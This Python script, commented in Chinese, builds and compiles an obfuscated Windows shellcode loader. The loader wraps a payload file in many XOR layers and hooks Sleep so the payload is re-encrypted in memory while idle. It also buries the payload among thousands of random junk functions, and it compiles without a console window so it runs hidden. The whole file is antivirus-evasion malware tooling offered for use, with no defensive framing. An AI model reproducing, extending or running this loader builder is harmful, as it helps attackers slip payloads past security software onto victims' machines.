import random
import string
import os
import subprocess
import xor
import trash_code
from pathlib import Path

def generate_obfuscated_code(
    num_junk_funcs, redundancy, sleep_range, xor_layers, max_deep,shellcode_file_path,num_fragments
):
    # 随机配置参数
    # num_junk_funcs = random.randint(4, 8)  # junk函数数量
    # redundancy = random.randint(3, 8)       # 冗余操作上限
    # sleep_range = random.randint(2, 5)       # 休眠时间范围（秒）

    # 生成随机函数名（避免重复）
    def random_func_name(prefix):
        return prefix + "_" + "".join(random.choices(string.ascii_lowercase, k=8))

    # 生成主调度器名称
    dispatcher_name = random_func_name("dispatcher")

    # 生成junk函数列表
    junk_func_names = [random_func_name(f"junk_{i+1}") for i in range(num_junk_funcs)]

    # 生成shellcode函数名称
    shellcode_name = random_func_name("shellcode")

    # 构建函数指针数组
    func_ptrs = ", ".join(junk_func_names + [shellcode_name])

    # 生成C代码
    code = (
        f"""#include<stdio.h>
#include<stdlib.h>
#include<time.h>
#include<windows.h>
#include<string.h>
#include<math.h>
void confuse();
BYTE OldSleepCode[12] = {{ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }};
BYTE HookSleepCode[12] = {{ 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF, 0xE0 }};
BYTE KEY = 0x00;
LPVOID pMemory = NULL;
unsigned char* hexData = NULL;
LPVOID foundAddress = NULL;





void NewSleep(int nSeconds)
{{
	nSeconds = nSeconds / 1000;
	int nRandom = rand() % 3 + 1;
	KEY = rand() % 255 + 1;
	confuse();

	nSeconds = nSeconds + rand() % 5 + 1;
	if (nRandom == 1)
	{{
		HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		WaitForSingleObject(hEvent, nSeconds * 1000);
	}}
	else if (nRandom == 2)
	{{
		HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		HANDLE hObjects[1] = {{ hEvent }};
		DWORD dwWaitResult = MsgWaitForMultipleObjects(1, hObjects, FALSE, nSeconds * 1000, QS_ALLINPUT);
	}}
	else if (nRandom == 3)
	{{
		HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		HANDLE hObjects[1] = {{ hEvent }};
		DWORD dwWaitResult = WaitForMultipleObjects(1, hObjects, FALSE, nSeconds * 1000);
	}}

	confuse();
	return;
}}

void HookSleep()
{{
	void* pSleepAdd = Sleep;

	DWORD OldProtect;
	if (VirtualProtect((LPVOID)pSleepAdd, 12, PAGE_EXECUTE_READWRITE, &OldProtect))
	{{
		memcpy(OldSleepCode, (LPVOID)pSleepAdd, 12);
		*(PINT64)(HookSleepCode + 2) = (INT64)&NewSleep;
	}}
	memcpy((LPVOID)pSleepAdd, &HookSleepCode, sizeof(HookSleepCode));
	VirtualProtect(pSleepAdd, 12, OldProtect, &OldProtect);
}}

// 函数声明
void {dispatcher_name}(int nDeep);
int {shellcode_name}();
"""
        + "\n".join([f"int {name}(int nDeep);" for name in junk_func_names])
        + xor.generate_shellcode_code(shellcode_file_path,xor_layers)
        +
        f"""
void confuse()
{{
	for (int i = 0;i < shellcode_length;i++)
	{{
		if (i % 4 == 0)
			((unsigned char*)pMemory)[i] ^= KEY;
		if (i % 4 == 1)
			((unsigned char*)pMemory)[i] ^= KEY + 1;
		if (i % 4 == 2)
			((unsigned char*)pMemory)[i] ^= KEY + 2;
		if (i % 4 == 3)
			((unsigned char*)pMemory)[i] ^= KEY + 3;
	}}
}}
        """
        + f"""

// 函数指针数组
void* apFunction[] = {{ {func_ptrs} }};
int nLength = {num_junk_funcs + 1}, nRedundancy = {redundancy}, nSleepRange = {sleep_range}, nClose = 1;

// 调度器实现
void {dispatcher_name}(int nDeep)
{{
    int nChoose = 0, nSleep = 0;
    if(nDeep>{max_deep})
    {{
    return;
    }}

    while (nClose)
    {{
        nChoose = rand() % (nLength + nRedundancy);
        if (nChoose >= nLength)
        {{
            nSleep = rand() % nSleepRange;
            Sleep(nSleep * 1000);
            nSleep = rand() % 2;
            continue;

            
        }}
        if (nChoose == nLength + nRedundancy - 1)
        {{
            break;
        }}
        if (((int(*)(int))(apFunction[nChoose]))(nDeep))
        {{
            nClose = 0;
        }}
    }}
}}

// Junk函数实现
"""
        + "\n\n".join(
            [
                f"""int {name}(int nDeep)
{{
    //printf("{name}\\n");
    {trash_code.generate_c_junk_code(num_fragments=num_fragments)}
    {dispatcher_name}(nDeep+1);
    return 0;
}}"""
                for name in junk_func_names
            ]
        )
        + f"""

// Shellcode函数实现
int {shellcode_name}()
{{
    // printf("{shellcode_name}\\n");
    execute_shellcode();
    return 1;
}}

// 主函数
int main()
{{
    
    srand((unsigned)time(NULL));
    {dispatcher_name}(0);
    return 0;
}}
"""
    )

    return code


def save_and_compile(code, output_dir="obfuscated_output"):
    # 创建输出目录（如果不存在）

    # 生成随机的C文件名
    c_filename = f"obfuscated_{random.randint(1000,9999)}.c"
    c_filepath = os.path.join(output_dir, c_filename)

    # 生成exe文件名（与C文件同名）
    exe_filename = c_filename.replace(".c", ".exe")
    exe_filepath = os.path.join(output_dir, exe_filename)

    # 保存C代码到文件
    with open(c_filepath, "w") as f:
        f.write(code)

    print(f"代码已保存至: {c_filepath}")

    # 编译成exe
    gcc_command = f'gcc "{c_filepath}" -s -mwindows -O2 -o "{exe_filepath}" -lrpcrt4'

    try:
        result = subprocess.run(
            gcc_command,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if result.returncode == 0:
            print(f"编译成功! EXE文件路径: {exe_filepath}")
            return exe_filepath
        else:
            print("编译失败，错误信息:")
            print(result.stderr.decode("utf-8"))
            return None
    except subprocess.CalledProcessError as e:
        print(f"GCC编译错误 (code {e.returncode}):")
        return None
    except Exception as e:
        print(f"编译过程发生异常: {str(e)}")
        return None

def env():
    current_dir = Path.cwd()
    target_path = current_dir / 'mingw64' / 'bin'
    abs_path = str(target_path.resolve())
    current_path = os.environ.get('PATH', '')
    if abs_path not in current_path:
        new_path = f"{abs_path};{current_path}"
        os.environ['PATH'] = new_path


if __name__ == "__main__":
    env()
    code = generate_obfuscated_code(
        num_junk_funcs=30000,   # junk函数数量
        redundancy=10,      # 冗余操作上限
        sleep_range=1,  # 休眠时间范围
        xor_layers=20000,   # 加密层数
        max_deep=30,    # 最大递归层数
        shellcode_file_path="payload_x64.bin",  #stageless shellcode文件路径
        num_fragments=10    # junk函数中垃圾代码片段数量
    )
    output_dir = "obfuscated_output"
    os.makedirs(output_dir, exist_ok=True)
    exe_path = save_and_compile(code, output_dir=output_dir)
